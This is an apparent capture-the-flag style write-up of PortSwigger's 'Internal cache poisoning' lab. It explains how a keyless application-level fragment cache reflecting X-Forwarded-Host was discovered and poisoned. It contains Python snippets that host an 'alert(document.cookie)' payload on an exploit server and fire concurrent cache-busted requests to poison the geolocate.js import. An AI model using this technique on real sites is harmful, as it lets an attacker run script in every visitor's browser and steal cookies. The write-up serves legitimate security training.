# Internal cache poisoning

**Category:** Web Cache Poisoning
**Difficulty:** EXPERT
**Lab:** https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal

Every lab before this one poisoned an externally visible cache — something with `X-Cache`, `Age`, or `Cache-Control` headers announcing that caching was happening at all. This lab has none of that. There's no external cache signal anywhere in its responses, which makes it easy to conclude there's nothing to poison. The actual caching happens one layer deeper, inside the application itself, on individual page fragments rather than whole responses — and that layer has no cache key at all.

## The Target

The home page is built from several independently generated fragments: a canonical `<link>` tag, a script import for `/resources/js/analytics.js`, and a script import for `/js/geolocate.js?callback=loadCountry`. Nothing in the response headers suggests any of this is cached.

## The Investigation

Treating the home page as a cache oracle the way earlier labs did — watching whether varying the query string produces a cache miss — showed that query string changes are always reflected, which by itself just says an *external* cache (if one exists at all here) keys on the full query string. It doesn't rule out caching happening somewhere else.

`X-Forwarded-Host` turned out to be reflected in all three fragments simultaneously — the canonical link, the analytics import, and the geolocate import. Sending a single poisoned request with `X-Forwarded-Host` set to a canary and watching what came back over repeated identical requests revealed the actual architecture: most of the time, only the canonical link and `analytics.js` URLs reflected our canary; the `geolocate.js` import kept its original value. Occasionally — inconsistently — all three would reflect it. That inconsistency was the signal: the `geolocate.js` fragment isn't computed fresh on every request the way the other two apparently are, it's being served from *its own* cached copy, refreshed independently on its own schedule. Once that copy's TTL happened to expire during one of our requests, our poisoned `X-Forwarded-Host` value got baked into it and stayed there on subsequent requests — regardless of whether we still sent the header at all.

We confirmed the fragment cache had no key whatsoever by removing `X-Forwarded-Host` entirely on the next request and resending: the `geolocate.js` fragment kept reflecting our poisoned value with no header attached, while the other two immediately reverted to normal, since they aren't cached and are computed fresh every time. That's the whole vulnerability — an internal, keyless cache storing a fragment built from an unkeyed header.

## The Exploit

We stored the payload at the path the poisoned fragment imports:

```python
store_data = {
    "responseFile": "/js/geolocate.js",
    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript",
    "responseBody": "alert(document.cookie)",
}
```

Poisoning the fragment meant getting past whatever *external* cache sits in front of the application first, since that layer does key on the query string and would otherwise keep serving us a stale response before our poisoned request ever reached the application layer capable of refreshing the internal fragment. We sent batches of concurrent requests, each with a unique cache-busting query parameter to force an external cache miss on every single one, all carrying the poisoned header:

```python
tasks = []
for i in range(20):
    cb = f"p{cycle}_{i}"
    tasks.append(c.get(f"{host}/?x={cb}", headers={"X-Forwarded-Host": exploit_host}))
await asyncio.gather(*tasks, return_exceptions=True)
```

Firing 20 concurrent, uniquely cache-busted requests per cycle meant a much higher chance that at least one of them would land during the narrow window the internal fragment cache happened to be refreshing — which is the only moment a request's `X-Forwarded-Host` value actually gets baked into the stored fragment. We checked a clean, header-less request after each batch to see if the fragment had picked up our poisoned host. In our solve, the `geolocate.js` fragment consistently poisoned while `analytics.js` did not — the two fragments clearly refresh on different, independent cycles, and we only needed one of them to succeed. Once `geolocate.js` was confirmed poisoned, any visitor loading the home page imports it from our exploit server and executes `alert(document.cookie)`.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution follows the same nine-step discovery and exploitation path: use the home page as a cache oracle, add a dynamic cache-buster query parameter (via Param Miner) to bypass the external cache, discover `X-Forwarded-Host` reflected across multiple resource URLs, notice the inconsistency where the canonical link and `analytics.js` update immediately but `geolocate.js` lags behind — evidence of a separately, internally cached fragment — keep resending until `geolocate.js` also picks up the poisoned value, confirm the internal fragment is keyless by removing the header and observing the poisoned value persists, then host the payload at `/js/geolocate.js` and repeat the poisoning request until all three URLs in the response reflect the exploit server.

The mechanism is identical to ours in every respect that matters. The one thing genuinely worth flagging from our own solve, because it's not really optional information but a fact about how this specific lab instance behaved: PortSwigger's own solution text explicitly acknowledges that *which* fragment poisons first is inconsistent and target-dependent, and our solve bore that out directly — `geolocate.js` poisoned reliably in our runs while `analytics.js` never did. The practical lesson from that isn't which specific fragment to target; it's to host the payload wherever the exploit server's own access log shows the victim's browser is actually requesting it from, since that's the fragment that got poisoned, not necessarily the one you expected.

## What This Teaches Us

This lab is a good argument for not concluding "no caching here" just because a target's HTTP responses carry none of the usual caching headers. An application-level fragment cache is invisible from the outside by construction — it's an internal performance optimization, not a CDN-facing contract, so there's no reason it would ever expose `X-Cache` or `Age` to a client. Worse, because it has no cache key at all (fragments aren't addressed by request identity, just by which piece of the page they render), a single poisoned fragment contaminates *every* page that happens to include it, not just the one URL the poisoning request targeted — which is a broader blast radius than any keyed cache in this series, achieved with less visible evidence than any of them.
